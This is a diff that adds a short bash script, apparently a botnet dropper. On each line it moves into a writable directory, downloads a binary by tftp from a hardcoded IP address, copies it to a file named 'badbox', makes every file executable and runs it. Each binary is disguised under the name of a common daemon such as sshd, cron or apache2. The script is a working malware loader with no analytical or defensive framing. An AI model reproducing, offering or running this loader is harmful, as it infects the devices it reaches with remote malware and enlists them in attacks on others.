@@ -1,0 +1,16 @@
+#!/bin/bash
+ulimit -n 1024
+cp /bin/busybox /tmp/
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.163.221.181 -c get ntpdhpa;cat ntpdhpa >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.163.221.181 -c get sshdhpa;cat sshdhpa >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.163.221.181 -c get opensshhpa;cat opensshhpa >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.163.221.181 -c get bashhpa;cat bashhpa >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.163.221.181 -c get tftphpa;cat tftphpa >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.163.221.181 -c get wgethpa;cat wgethpa >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.163.221.181 -c get cronhpa;cat cronhpa >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.163.221.181 -c get ftphpa;cat ftphpa >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.163.221.181 -c get pftphpa;cat pftphpa >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.163.221.181 -c get shhpa;cat shhpa >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.163.221.181 -c get ' ';cat ' ' >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.163.221.181 -c get apache2hpa;cat apache2hpa >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.163.221.181 -c get telnetdhpa;cat telnetdhpa >badbox;chmod +x *;./badbox
